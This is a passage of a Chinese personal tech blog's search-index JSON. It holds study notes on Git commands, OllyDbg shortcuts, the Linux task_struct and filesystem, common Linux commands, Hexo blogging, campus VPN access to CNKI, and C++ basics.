指针不会移动，回滚 git reset 版本快照的 ID 号 前滚 比较 比较暂存区域与工作目录 git diff //比较差异 第二行 比较暂存区域和工作目录下的 README.md a 代表暂存区域下的文件夹 b 代表工作区域下的文件夹 第三行 1a5af1f…20f3146 表示文件ID， 100644 指定文件类型和权限 第四行 — 三个减号，表示是旧文件存放在暂存区域 第五行 +++ 三个加号，表示是新文件存放在工作目录 第六行 中间的减号（-）代表旧文件，后面紧接着的数字代表开始行号，逗号后面的数字代表持续的行数 第七行 减号后面，代表删减的内容 第八行 加号后面，代表增加的内容 第九行 两个版本共有的内容 如果后面有冒号（：）代表文件内容未完全显示，需要输入命令查看或退出 常用命令 j 向下移动一行 f 向下移动一页 b 向上移动一页 d 向下移动半页 u 向上移动半页 g 跳到第一行 G 跳到最后一行 3g 跳到第3行 / 从上往下搜索 ? 从下往上搜索 /+搜索内容 按内容查找 h 显示帮助文档 q 退出 比较当前工作目录和 Git 仓库中的快照 git diff 快照ID 比较暂存区与 Git 仓库中的快照 git diff --cached 快照ID 终极奥义图 修改最后一次提交 在实际开发中,你可能会遇到以下两种情景: 情景一:版本刚一提交(commit）到仓库，突然想起漏掉两个文件还没有添加( add ) 。 情景二:版本刚一提交( commit）到仓库，突然想起版本说明写得不够全面，无法彰显你本次修改的重大意义… 执行带 – amend 选项的 commit 提交命令, Git 就会 “更正” 最近的一次提交 git commit --amend 删除文件后恢复 git checkout --文件名 恢复已删除的文件 删除文件 git rm 文件名 删除工作区域和暂存区域的文件，也就是取消跟踪，不纳入下一个版本管理，但不能删除已经提交在 git 仓库里的文件 git rm -f 文件名 强制删除工作区域和暂存区域所有【文件名】文件，在工作目录和暂存区的同一个文件不同内容时使用 git rm --cached 文件名 只删除暂存区的文件 git reset --soft HEAD~ soft 修改指针 重命名文件 git mv 旧文件名 新文件名 ren/mv 旧文件名 新文件名 git rm 旧文件名 git add 新文件名 Git 分支 创建分支 git branch 分支名 切换分支前 切换分支 git checkout 分支名 切换到feature分支后 向 feature 分支添加内容后 向 master 添加新内容后 git log --oneline --graph --all 以图形化显示所有分支 合并和删除分支 实际开发中的分支 合并分支 git merge 分支名 删除分支 git branch -d 分支名 git branch --delete 分支名 匿名分支 checkout 命令 功能 从历史快照（或者暂存区域）中拷贝文件到工作目录 git checkout – README.md 加（–）是预防你恰好有一个 README.md 的分支，产生矛盾 切换分支 checkout 命令与 reset 命令区别 恢复文件 checkout 命令和 reset 命令都可以用于恢复指定快照的指定文件，并且它们都不会改变 HEAD 指针的指向。 下面开始划重点∶ 它们的区别是 reset 命令只将指定文件恢复到暂存区域（–mixed ），而 checkout 命令是同时覆盖暂存区域和工作目录。 注意∶也许你试图使用 git reset --hard HEAD~README.md 命令让 reset 同时覆盖工作目录，但 Git 会告诉你这是徒劳（此时 reset 不允许使用 --soft 或 --hard 选项)。 这样看来，在恢复文件方面，reset 命令要比 checkout 命令更安全一些。 恢复快照 reset 命令是用来 “ 回到过去 ” 的，根据选项的不同，reset命令将移动 HEAD 指针 ( --soft ) -&gt; 覆盖暂存区域 ( --mixed，默认 ) -&gt; 覆盖工作目录 ( --hard )。 checkout 命令虽说是用于切换分支，但前面你也看到了，它事实上也是通过移动 HEAD 指针和覆盖暂存区域、工作目录来实现的。 那问题来了:它们有什么区别呢? 下面开始划重点∶ 第一个区别是，对于 reset --hard 命令来说，checkout 命令更安全。因为 checkout 命令在切换分支前会先检查一下当前的工作状态，如果不是 “clean” 的话，Git 不会允许你这样做；而 reset --hard 命令则是直接覆盖所有数据。 另一个区别是如何更新 HEAD 指向，reset 命令会移动 HEAD 所在分支的指向，而 checkout 命令只会移动 HEAD 自身来指向另一个分支。","categories":[{"name":"工具","slug":"工具","permalink":"https://www.rgzzplus.com/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"Git","slug":"Git","permalink":"https://www.rgzzplus.com/tags/Git/"}]},{"title":"Ollydebug快捷键","slug":"Ollydebug快捷键","date":"2022-03-19T13:11:02.000Z","updated":"2022-03-19T13:12:27.305Z","comments":true,"path":"2022/03/19/Ollydebug快捷键/","link":"","permalink":"https://www.rgzzplus.com/2022/03/19/Ollydebug%E5%BF%AB%E6%8D%B7%E9%94%AE/","excerpt":"","text":"按键 说明 F2 下断点，也就是指定端点的地址 F3 加载一个可执行程序，进行调试分析 F4 程序执行到光标处 F5 缩小、还原当前窗口 F7 单步步入 F8 单步步过 F9 直接运行程序，遇到断点处，程序暂停 Ctrl+F2 重新运行程序到起始处，一般用于重新调试程序 Ctrl+F9 执行到函数返回处，用于跳出函数实现 Alt+F9 执行到用户代码处，用于快速跳出系统函数 Ctrl+G 输入十六进制地址，快速定位到该地址处","categories":[{"name":"工具","slug":"工具","permalink":"https://www.rgzzplus.com/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"ollydebug","slug":"ollydebug","permalink":"https://www.rgzzplus.com/tags/ollydebug/"}]},{"title":"task_struct","slug":"task-struct","date":"2022-03-19T12:46:50.000Z","updated":"2022-08-01T11:20:15.318Z","comments":true,"path":"2022/03/19/task-struct/","link":"","permalink":"https://www.rgzzplus.com/2022/03/19/task-struct/","excerpt":"","text":"[toc] 阅前提示：本文来自《LINUX内核设计与实现》第三章内容总结，如有不足和错误，请在评论区告诉我 task_struct结构体 task_struct 被称为进程描述符，它定义在&lt;linux/sched.h&gt;文件中，进程描述符中包含一个具体进程的所有信息。 进程描述符中包含的数据能完整的描述一个正在执行的程序：程序打开的文件，进程的地址空间，挂起的信号，进程的状态，等等 分配进程描述符 Linux通过slab分配器分配 stak_struct 结构，目的是为了达到对象复用和缓存着色（注：通过预先分配和重复使用 task_struct，可以避免动态分配和释放所带来的资源消耗）。每个进程的 task_struct 存放在它们内核栈的栈尾。 slab分配器在栈底（对于向下增长的栈来说）或栈顶（对于向上增长的栈来说）创建一个新的结构 struct thread_info，此结构中的 task域中存放指向该任务实际 task_struct的指针，以方便在汇编代码中计算其偏移。 进程描述符的存放 内核通过一个唯一的进程标识符（process identification value）或 PID 来表示每个进程。PID是一个最大默认值为 32768 的 int型数。它被存放在各自的进程描述符中。 进程状态 进程描述符中的 state域描述了进程的当前状态，该域的值： 状态标志（域值） 说明 TASK_RUNNING 运行，表示进程是可执行的；它或者正在执行，或者在运行队列中等待执行 TASK_INTERRUPTIBLE 可中断，进程被阻塞，等待某些条件达成，一旦条件满足，进程就被唤醒，切换为运行状态 TASK_UNINTERRUPTIBLE 不可中断，进程不会因为接收到信号而被唤醒切换为运行 TASK_ZOMBIE 僵死，该进程已经结束了，但其父进程还没有释放其所获得的资源 TASK_STOPPED 停止，进程没有投入运行，也不能投入运行","categories":[{"name":"操作系统","slug":"操作系统","permalink":"https://www.rgzzplus.com/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"task_struct","slug":"task-struct","permalink":"https://www.rgzzplus.com/tags/task-struct/"}]},{"title":"免费建站","slug":"免费建站","date":"2022-03-17T12:48:04.000Z","updated":"2022-08-01T10:30:42.275Z","comments":true,"path":"2022/03/17/免费建站/","link":"","permalink":"https://www.rgzzplus.com/2022/03/17/%E5%85%8D%E8%B4%B9%E5%BB%BA%E7%AB%99/","excerpt":"","text":"[TOC] 免费建站 注册 Github 账号，并创建仓库 创建仓库(仓库名格式：账户名.github.io) https://blog.csdn.net/weixin_43729943/article/details/103915046 添加ssh https://blog.csdn.net/u013778905/article/details/83501204 本地nodejs，Git环境搭建 教程 https://hexoscript.gitbook.io/hexo-script/v/1.3-1/shi-yong-bu-zhou/zhun-bei-gong-ju 利用hexo搭建博客 教程 https://hexoscript.gitbook.io/hexo-script/v/1.3-1/shi-yong-bu-zhou/yi-jian-an-zhuang-hexo-bo-ke 官方文档 https://hexo.io/zh-cn/docs/ 主题 挑选主题 https://hexo.io/themes/ 配置主题 自行阅读主题文件夹下的 README.md文件 百度收录 https://zhuanlan.zhihu.com/p/100922816 最后 在此附上B站大佬的建站视频教程：https://www.bilibili.com/video/BV1mU4y1j72n","categories":[{"name":"经验交流","slug":"经验交流","permalink":"https://www.rgzzplus.com/categories/%E7%BB%8F%E9%AA%8C%E4%BA%A4%E6%B5%81/"}],"tags":[{"name":"hexo","slug":"hexo","permalink":"https://www.rgzzplus.com/tags/hexo/"},{"name":"建站","slug":"建站","permalink":"https://www.rgzzplus.com/tags/%E5%BB%BA%E7%AB%99/"}]},{"title":"linux指令","slug":"linux指令","date":"2022-03-15T10:02:50.000Z","updated":"2022-08-01T11:19:26.662Z","comments":true,"path":"2022/03/15/linux指令/","link":"","permalink":"https://www.rgzzplus.com/2022/03/15/linux%E6%8C%87%E4%BB%A4/","excerpt":"","text":"[toc] Linux 命令 名字 语法 用法 全称或备注 . 当前目录 … 上级目录 ~ 用户主目录 普通用户的主目录为/home；超级用户的主目录为/root - 前一个工作目录 / 表示根目录 cd cd [相对路径或绝对路径] 切换到目标工作目录 change directory pwd pwd 查看或打印当前目录 print working directory type type [命令名] 用来显示指定命令类型 ls ls 显示当前目录下的文件 ll ll 显示当前目录下文件详细信息 ls -l --color=auto ll -a ll -a 显示当前目录下文件及隐藏文件详细信息 mkdir mkdir -p a/b/c/d/e/f 会自动创建文件父目录mkdir -p lucky/{1234}ls 一次可以创建多个子目录 创建文件目录 make directory rm rm -rf [目录名] 删除文件夹，强制删除 remove rmdir rmdir [目录名] 删除文件目录，要求该文件夹是空文件夹 remove directory cp cp [选项] 源路径 存放路径cp 源路径 存放路径 拷贝文件到文件夹，复制 copy * shiren* 所有以’shiren’开头的文件夹 mv mv 源路径 存放路径 1、移动文件到文件夹，剪切2、修改文件名字 move touch touch 文件名 如果没有该文件，则创建新文件；如果有该文件，则修改该文件的三个时间 stat 文件属性 state cat cat 文件名 正序查看文件内容 tac tac 文件名 倒序查看文件内容 more more 文件名 分页查看文件内容 敲回车，一行行显示后续内容；敲 ‘b’ 返回上一行；敲空格，一页页显示后续内容；敲 ‘h’ 显示帮助，更多指令 less less 文件名 与more功能基本一样，区别是less的操作命令更多 head head -10 文件名 查看文件前10行 tail tail -10 文件名tail -f 文件名tail -F文件名 查看文件后10行监控文件变化，按Inode查找监控文件变化，按文件名查找 | 竖杠 head -8 文件名 | tail -1 ‘|’ 将前面查询结果传递给后面，只查询第8行 find find / -name 文件名 在 / 内查找叫[文件名]的文件 echo ln ln -s 目标文件名 链接文件名 |创建软链接，类似指针ln 目标文件名 链接文件名 |创建硬链接，类似取别名 创建文件链接 ip addr ip addr ip查询 终端相关 快捷键 Ctrl+Alt+T：桌面打开终端 exit 或 快捷键 Ctrl+D：结束终端会话 时间相关 date：显示当前时间和日期 cal：默认显示当前月份的日历 磁盘相关 df：查看磁盘的当前可用空间 free：查看内存容量 文件相关 pwd：输出当前的工作目录名称，【print working directory】 ls：列出目录内容 cd：修改目录 tips： 焦点跟随鼠标 $ 代表普通用户； # 代表超级用户 linux命令 ll信息详解 参考文章 第一列：文件类型 ‘-’ 普通文件 ‘d’ 文件夹、目录 ‘l’ 链接文件，类似于windows的快捷方式 ‘p’ 管理文件 ‘b’ 块设备文件 ‘c’ 字符设备文件 ‘s’ 套接字文件 后列：文件属性 r（Read，读取权限）：对文件而言，具有读取文件内容的权限；对目录来说，具有浏览目录的权限。 w（Write，写入权限）：对文件而言，具有新增、修改文件内容的权限；对目录来说，具有删除、移动目录内文件的权限。 x（execute，执行权限）：对文件而言，具有执行文件的权限；对目录来说，该用户具有进入目录的权限。 另外，这里还有2个很特殊的属性，平时不怎么常见，这里也顺带解释一下： s或S（SUID,Set UID）：可执行的文件搭配这个权限，便能得到特权，任意存取该文件的所有者能使用的全部系统资源。请注意具备SUID权限的文件，黑客经常利用这种权限，以SUID配上root帐号拥有者，无声无息地在系统中开扇后门，供日后进出使用。 t或T（Sticky）：/tmp和 /var/tmp目录供所有用户暂时存取文件，亦即每位用户皆拥有完整的权限进入该目录，去浏览、删除和移动文件。 综合起来可得，对于back_init文件，其创建者/所有者具有可读可写可执行的权限，其创建者/所有者所在的组的其他用户具有可读可写可执行的权限，其他组的其他用户则具有可读可执行但不可写的权限。 type详解 参考文章 一般情况下，type命令被用于判断另外一个命令是否是内置命令，但是它实际上有更多的用法。 判断一个名字当前是否是alias、keyword、function、builtin、file或者什么都不是： type ls 的输出是 ls 是 ‘ls --color=auto’ 的别名 type if 的输出是 if 是 shell 关键字 type type 的输出是 type 是 shell 内嵌 type frydsh 的输出是 bash: type: frydsh: 未找到 判断一个名字当前是否是alias、keyword、function、builtin、file或者什么都不是的另一种方法（适用于脚本编程）： type -t ls 的输出是 alias type -t if 的输出是 keyword type -t type 的输出是 builtin type -t gedit 的输出是 file type -t frydsh 没有输出 显示一个名字的所有可能： type -a kill 的输出是 kill 是 shell 内嵌 和 kill 是 /bin/kill type -at kill 的输出是 builtin 和 file 查看一个命令的执行路径（如果它是外部命令的话）： type -p gedit 的输出是 /usr/bin/gedit type -p kill 没有输出（因为kill是内置命令） 强制搜索外部命令： type -P kill 的输出是 /bin/kill cp命令相关选项 参考文章 cp命令的各选项含义如下： - a 该选项通常在拷贝目录时使用。它保留链接、文件属性，并递归地拷贝目录，其作用等于dpR选项的组合。 - d 拷贝时保留链接。 - f 删除已经存在的目标文件而不提示。 - i 和f选项相反，在覆盖目标文件之前将给出提示要求用户确认。回答y时目标文件将被覆盖，是交互式拷贝。 - p 此时cp除复制源文件的内容外，还将把其修改时间和访问权限也复制到新文件中。 - r 若给出的源文件是一目录文件，此时cp将递归复制该目录下所有的子目录和文件。此时目标文件必须为一个目录名。 - l 不作拷贝，只是链接文件。 需要说明的是，为防止用户在不经意的情况下用cp命令破坏另一个文件，如用户指定的目标文件名已存在，用cp命令拷贝文件后，这个文件就会被新源文件覆盖，因此，建议用户在使用cp命令拷贝文件时，最好使用i选项。 例子： Cp -i file1 file2 (将文档 file1 复制成 file2 . –i为提示确认。) cp file1 dir1 将文档 file1 复制到目录 dir1 下，文件名仍为 file1. cp /tmp/file1 . 将目录 /tmp 下的文档 file1复制到现行目录下，档名仍为 file1. cp /tmp/file1 file2 将目录 /tmp 下的文档 file1现行目录下，档名为file2 cp -r dir1 dir2 (recursive copy) 复制整个目录.若目录 dir2 不存在，则将目录dir1，及其所有文档和子目录，复制到目录 dir2 下，新目录名称为dir1.若目录dir2不存在，则将dir1，及其所有文档和子目录，复制为目录 dir2. stat 文件属性详解 File：文件名 Size：大小 Blocks：块 IO Block：分配（一般为 4k=4096 ） Device：存放在硬盘区位置 Inode：文件绝对位置 Links：静态硬连接数量 Access：文件权限 Uid：所属用户 Gid：所属组 Access：访问文件时间 Modify：文件内容发生变化时间 Change：文件权限改变时间 ln 创建文件详解 ln -s 目标文件名 链接文件名 |创建软链接，形式是 ‘l’ 链接，链接文件 Inode 属性不同，类似于指针ln 目标文件名 链接文件名 |创建硬链接，形式是 ‘-’ 文件，链接文件 Inode 属性相同，类似于别名 VI 和 VIM 编辑器","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://www.rgzzplus.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Linux常用命令","slug":"Linux常用命令","permalink":"https://www.rgzzplus.com/tags/Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"}]},{"title":"如何校外访问知网？","slug":"校外访问登录知网","date":"2022-03-14T05:08:53.000Z","updated":"2022-08-01T11:15:44.369Z","comments":true,"path":"2022/03/14/校外访问登录知网/","link":"","permalink":"https://www.rgzzplus.com/2022/03/14/%E6%A0%A1%E5%A4%96%E8%AE%BF%E9%97%AE%E7%99%BB%E5%BD%95%E7%9F%A5%E7%BD%91/","excerpt":"","text":"[toc] 知网困境 中国大学生苦知网久矣，众所周知，大学毕业要求要写论文。那么，查资料就是必不可少的一环，而中国知网，下载或阅读一篇论文，收费2元+。一篇还好，关键是，你写论文肯定就不会只参考一篇文章吧，多起来你可能要阅读100+篇才写的下来，那这些费用学生只能勉强负担。 其实，学校一般都会购买知网的版权，以供学生免费阅读下载知网的论文期刊。下面我先讲讲校园网登录知网吧。 校园网IP 登录知网 一般都在知网登录界面，有一个IP登录，如下图所示 如果你没有连接校园网，就无法使用这里的 IP登录。 但是，这种方式一般都有一个硬性条件，你必须要能够连接到校园网。由于校园网无法完全覆盖学校，比如我们宿舍就连不上校园网，而且我们用的宽带是电信宽带（一般校园网宽带都很慢），所以就无法使用校园网提供的 IP登录知网。而且写论文的主力军 — 大四，通常在最后几个学期就在校外实习，很少有时间回学校，更需要访问知网。 以下为本文重点！！ 所以这个时候就要用到远程访问技术来接入到学校内网。一般学校的官网就会提供远程访问的方法，但据我所知，很多学生都不知道。所以接下来我来向大家介绍如何远程访问内网资源（主要是上知网）。 登录学校官网 先进入学校官网：武汉轻工大学 以学生身份登入学生管理系统 找到VPNWeb资源 然后往下滑动，在应用中心找到VPNWeb资源，进入 阅读VPN客户端使用说明及下载 在VPN客户端使用说明及下载中一般都会介绍如何使用VPN客户端 下载VPN客户端 下载VPN客户端有两种方式 第一种方法，直接将VPN客户端使用说明及下载翻到文末，有一个附件可以下载 第二种方法，返回信息门户，找到VPN客户端下载，点击跳转后，找到下载查看就行 解压到本地并安装 解压压缩包 打开解压位置，找到EasyConnectInstaller.exe 双击它，然后你可能跟我一样会弹出提示，选择是 然后就进行安装过程了 配置软件 然后在桌面会找到EasyConnectInstaller的图标，双击进入 然后再服务地址内输入：https://vpn.whpu.edu.cn，选择连接 等待它下载并安装组件 组件安装完成后，就会弹出下图，选择同意 然后单击图示图标 用户名为统一身份认证账号密码，就是你登录学生管理系统的账号密码（注：记得勾选记住密码，以便下次访问） 登录后在软件主页面找到中国知网访问，安全提示选择是，就会通过默认浏览器进入知网了 验证能否免费使用知网 然后我们在知网页面随便搜索点东西 跳转后我们可以看到，我们已经以学校登录了，现在我们就能随便阅读下载知网论文了 其它 其它学校也大同小异，只要能在学生管理系统中找到VPN字样就也能看到教程和软件资源下载。最后，祝大家生活快乐！","categories":[{"name":"经验交流","slug":"经验交流","permalink":"https://www.rgzzplus.com/categories/%E7%BB%8F%E9%AA%8C%E4%BA%A4%E6%B5%81/"}],"tags":[{"name":"中国知网","slug":"中国知网","permalink":"https://www.rgzzplus.com/tags/%E4%B8%AD%E5%9B%BD%E7%9F%A5%E7%BD%91/"}]},{"title":"hexo写作","slug":"hexo写作","date":"2022-03-13T10:09:13.000Z","updated":"2022-08-01T11:18:38.746Z","comments":true,"path":"2022/03/13/hexo写作/","link":"","permalink":"https://www.rgzzplus.com/2022/03/13/hexo%E5%86%99%E4%BD%9C/","excerpt":"","text":"[toc] 创建新文章 在命令行中输入： 1hexo new [layout] &lt;title&gt; 如果没有设置 layout 的话，默认使用 _config.yml 中的 default_layout 参数代替。（默认在博客文件夹下的source文件夹）如果标题包含空格的话，请使用引号括起来。 参数 描述 -p, --path 自定义新文章的路径 -r, --replace 如果存在同名文章，将其替换 -s, --slug 文章的 Slug，作为新文章的文件名和发布后的 URL 创建草稿 在命令行中输入： 1hexo new draft &lt;title&gt; 如果你从未使用过草稿功能，这条指令会自动在博客文件夹下的source文件夹内创建一个_draft文件夹，以后你创建的草稿都会被保存到这个文件夹下。同时这条指令也是创建草稿的命令。title标题如果有空格也是要用引号括起来的。 然后你就可以到_draft文件里用编辑器编辑文件。 发表草稿 在命令行中输入： 1hexo publish [layout] &lt;filename&gt; 在编辑完文件后，就要发表文章，就是把草稿变成新文章，实际上是将草稿文件从source/_draft移动到source/_posts。layout默认就是source/_posts，filename是你要发表的文件名。如果你是按照上面创建的草稿，那filename就是title。 预览文章 在命令行中输入： 12hexo ghexo s hexo g是hexo generate的缩写，生成静态文件。 hexo s是hexo server的缩写，启动服务器。默认情况下，访问网址为： http://localhost:4000/ 在将文章上传到网站前，我们要想预览一下效果，看看文章在网站上好不好看，排版是否清晰，就输入上面两条指令先进行本地渲染。然后再浏览器中输入上面的网址，就能访问本地服务器来预览网站了。 发表文章 在命令行中输入： 12hexo ghexo d hexo d是hexo deploy的缩写，部署网站，即把文章上传到网站中。 参考链接 hexo官方文档","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://www.rgzzplus.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"hexo","slug":"hexo","permalink":"https://www.rgzzplus.com/tags/hexo/"}]},{"title":"Linux二级目录","slug":"linux二级目录","date":"2022-03-13T09:37:43.000Z","updated":"2022-08-01T11:18:53.434Z","comments":true,"path":"2022/03/13/linux二级目录/","link":"","permalink":"https://www.rgzzplus.com/2022/03/13/linux%E4%BA%8C%E7%BA%A7%E7%9B%AE%E5%BD%95/","excerpt":"","text":"Linux二级目录 /bin 存放二进制可执行文件，‘binary’ 二进制 /sbin 存放超级管理员可执行的一些权限和命令，‘system binary’ /boot 存放Linux系统启动的文件，启动配置以及内核的镜像 ‘boot’ 引导 /dev 存放系统下的所有设备文件，‘device’ 设备 /etc 存放系统配置文件，意思是等等，etc来源见文末 /home 普通用户家目录 类似 windows 的 c:user 目录 /lib 存放系统使用函数库的目录，‘library’ 图书馆，库 /media 软盘或者光盘等的挂载点，‘media’ 媒体，介质 /mnt 硬盘默认挂载目录，‘mount’ 嵌入 /opt 自定义(第三方)软件安装位置，‘optional’ 可选择 /proc 一个虚拟的文件系统(只存在内存中，不是实际贮存在磁盘上的)，包括被某些程序使用的系统信息，‘process’ 进程 /root 超级用户家目录，‘root’ 根,(注:它不是系统的根&quot;/&quot; ) /run 运行时的一些临时文件，‘run’ 运行 /srv 存放服务启动后所需数据，‘service’ 服务 /sys 存放系统内核信息文件，‘system’ 系统 /tmp 系统临时文件目录，重启清除，‘temporary’ 临时的 /usr 操作系统软件资源所放置的目录，即系统默认软件放置位置，‘Unix Software Resource’ /var 系统产生经常变化的文件目录，‘variable’ 可变的 “etc来源”: etc不是什么缩写，是and so on的意思，来源于法语的 et cetera 翻译成中文就是 等等 的意思. 至于为什么在/etc下面存放配置文件， 按照原始的UNIX的说法 ( Linux文件结构参考UNIX的教学实现MINIX ) 这下面放的都是一堆零零碎碎的东西, 就叫etc, 这其实是个历史遗留.这个是来源于拉丁语全称etcetera. n.等等之人（或物），附加的人（或物）；加s：附加（或额外）的项目；零星杂物。或者分开的et cetera, adv. 等等，以及其他等等（略作etc.或＆c.）但得注意，人名后不宜用，要用and others。这个目录在LINUX里很重要哦，里面装的都是些杂七杂八的配置文件。","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://www.rgzzplus.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.rgzzplus.com/tags/Linux/"}]},{"title":"起源","slug":"hello-world","date":"2022-03-11T05:26:57.197Z","updated":"2022-08-01T11:18:29.549Z","comments":true,"path":"2022/03/11/hello-world/","link":"","permalink":"https://www.rgzzplus.com/2022/03/11/hello-world/","excerpt":"","text":"[toc] Welcome to my Blog. 我是人工智障，关于博客，早在高中，我就有要做一个属于我自己的博客的想法。只不过那时迫于学业压力，我一直把这个想法埋藏在心底。后来，我也尝试过，限于能力和方法，始终没能做出东西。 后来我终于找到了正确的建站方法，使用 hexo + github 的方法终于把博客给搭建了起来。当然，也只是成功搭建了起来，由于不熟悉 hexo和 github 我也走了不少弯路，配置和文件管理一片混乱，使得我不得不删库重建。前前后后一共建了 6 个本地库和 2 个远程库，中间也熬了一周的夜，反复琢磨。有时上课也不得闲，都想着怎么消除 Bug。 自己独立搭建博客，还是很痛苦的，出了 Bug ，没人指导，即使你看不懂，你还是要硬着头皮上，熬夜修 Bug 那是常态。有时，碰上一些实在无法解决的 Bug ，你就不得不从头开始 （搭建博客时，Git用的很烂）。 经验与教训 下面是我搭建博客总结的一些经验： 一定要单步调试，一定要单步调试，一定要单步调试，重要的话说 3 遍，单步调试，能很轻易的让你发现错误源头，解决起来也很方便。 看官方文档，就拿 hexo 举例吧，最开始我是看 CSDN 上别人的博文使用 hexo 的，但是那些博文质量参差不齐，大多数都是基于官方文档总结的，有的甚至有错误，我就是踩了坑，才删了那么多库。 使用别人的主题一定要看 README.md 文件，这里面基本涵盖了如何安装和使用的详细步骤，至于为什么不看别人的总结，理由同上第二条。 最后，耐心，耐心，再耐心，仔细，仔细，再仔细。 如果你们对搭建博客感兴趣，就在留言区告诉我吧！","categories":[{"name":"个人","slug":"个人","permalink":"https://www.rgzzplus.com/categories/%E4%B8%AA%E4%BA%BA/"}],"tags":[{"name":"杂谈","slug":"杂谈","permalink":"https://www.rgzzplus.com/tags/%E6%9D%82%E8%B0%88/"},{"name":"心路","slug":"心路","permalink":"https://www.rgzzplus.com/tags/%E5%BF%83%E8%B7%AF/"}]},{"title":"C++ 教程","slug":"C","date":"2022-03-10T08:32:34.000Z","updated":"2022-08-01T11:17:39.865Z","comments":true,"path":"2022/03/10/C/","link":"","permalink":"https://www.rgzzplus.com/2022/03/10/C/","excerpt":"","text":"[toc] 符号 using namespace std; 这条指令是一个全新的概念：名字空间 所有标识符都在一个特殊的名字空间 std 中来定义，用以区分不同的命名版本 cout &lt;&lt; 有此指令 std::cout &lt;&lt; 无此指令 让程序访问名称空间 std 的方法 将指令放在函数定义前，让文件中所有函数都能使用名称空间std中所有元素 将指令放在特定的函数定义中，让该函数能够使用名称空间std中所有元素 在特定的函数中使用类似 using std::cout; 这样编译指令，让该函数使用指定的元素，如 cout 完全不使用编译指令 using ，而在需要使用名称空间std中的元素时，使用前缀 std:: cout 全名 console out ，cout 是一个输出流对象 &lt;&lt; 名称：插入运算符 在 c 中是左移操作符 在 c++ 中它有另一个特点：支持重载。 重载，即同一个运算符将有不同的含义。编译器通过上下文来确定运算符的含义。 cin 流对象，从用户终端读取数据 &gt;&gt; 输入操作符又称提取符，它一次从输入流对象 cin 提取一个元素 如果用户不进行键盘输入，则程序会阻塞。 const 限定符 作用：只要一个变量前面用 const 来修饰，该变量里的数据可以被访问，不能被修改，也就是只读。const 与 宏定义（define）效果差不多 只要一个变量前面用 const 来修饰，该变量里的数据可以被访问，不能被修改，也就是只读。const 与 宏定义（define）效果差不多 规则：const 离谁近，谁就不能被修改；比较复杂时，从右往左读 const 修饰一个变量，一定要给这个变量初始化值，若不初始化，后面就无法初始化。 const type name = value； &lt;!--code￼0--&gt; //下面给出正确的赋值方法: 12345678#include &lt;iostream&gt;using namespace std;int main()&#123; const double pi=3.141592; //圆周率的值用pi表示 cout&lt;&lt;&quot;圆周率的近似值是&quot;&lt;&lt;pi&lt;&lt;endl; return 0;&#125; 与 define 相比 可以明确指定类型 可以使用作用域规则将定义限制在特定的函数或文件中 可以将 const 用于更复杂的类型 endl 名称：控制符。作用：重起一行。光标将被移到下一行开头。 \\n 也可以用，不过，使用它不能保证程序继续运行前将其立即显示在屏幕上 = 名称：赋值运算符，在 c 和 c++ 中可以连续使用，如 a=b=c=1 {} 大括号初始化器，使用它初始化时，可以使用等号（=），也可以不使用 int emus&#123;7&#125;; &lt;!--code￼2--&gt; 大括号中可以不包含任何东西，变量将被初始化为0； int rocs=&#123;&#125;； &lt;!--code￼3--&gt; ： 1、类构造函数 (Constructor) 的初始化列表 在构造函数后面紧跟着冒号加初始化列表，各初始化变量之间以逗号 (,) 隔开。下面举个例子。 123456789101112131415161718192021class myClass&#123;public :myClass();// 构造函数，无返回类型，可以有参数列表，这里省去~myClass();// 析构函数int a;const int b;&#125;myClass::myClass():a(1),b(1)// 初始化列表&#123;&#125; 上面的例子展示了冒号的这个用法，下面对这个用法进行几点说明： 1)初始化列表的作用相当于在构造函数内进行相应成员变量的赋值，但两者是有差别的。 在初始化列表中是对变量进行初始化，而在构造函数内是进行赋值操作。两都的差别在对于像const类型数据的操作上表现得尤为明显。我们知道，const类型的变量必须在定义时进行初始化，而不能对const型的变量进行赋值，因此const类型的成员变量只能（而且必须）在初始化列表中进行初始化，即下面的代码将会出错： 123456789myClass::myClass（）&#123;a = 1;// 没错，效果相当于在初始化列表中进行初始化b = 1;// 出错，const变量不能进行赋值操作；&#125; 2）初始化的顺序与成员变量声名的顺序相同。 先看一下下面的程序： 12345myClass::myClass():b(1),a(b)&#123;&#125; 这样的执行结果a,b各是多少呢？b=1,a=1?不是，b=1而a是个随机数。这一点是相当重要的哦，一般在初始化列表中进行初始化时，初始化的顺序应与声明的顺序保持一致，防止出现不必要的错误。 3）对于继承的类来说，在初始化列表中也可以进行基类的初始化，初始化的顺序是先基类初始化，然后再根据该类自己的变量的声明顺序进行初始化。 2、声明基类。 假设我们重新定义一个类，继承自myClass类。定义方式如下： 1234567class derivedClass : public myClass&#123;// 略去&#125; 这里的冒号起到的就是声名基类的作用，在基类类名前面可以加 public\\private\\protected 等标签，用于标识继承的类型，也可以省略，省略的话，用 class 定义的类默认为 private ，用 struct 定义的类默认为 public ，至于具体各个标签有什么区别这里就不说了。 与初始化列表一样的，这里也可以声名多个基类，各基类之间用逗号(,)隔开。 其它字符 \\n 换行符 \\t 水平制表符 \\v 垂直制表符 \\b 退格 \\r 回车 \\a 振铃 \\ 反斜杠 \\ C++基本语法 函数 cin cin.peek();就是返回输入流里面的第一个字符，但是不会像 get 那样取出来 cin.get(数组名，长度，结束符);会提取出输入的第一个字符 cin.ignore(长度，结束符); 从输入流（cin）中提取字符，提取的字符被忽略（ignore），不被使用的 cin.getline(数组名，长度，结束符);提取一行 cin.read(buf,20);把数据读入数据流中 cin.clear(); 清理错误表示符 cout cout.precision();精度 cout.width();长度 cint(小数);将此小数四舍五入 其它方法： 12int x=2.6;int i=(int)(x+0.5); 文件 in，out getc() 函数一次从输入流（stdin）读取一个字符，返回值是int类型。 putc()函数把这个字符写入到输出流（stdout） EOF 宏定义 end of file 一般是文件的结尾，值为 -1 open() 指针 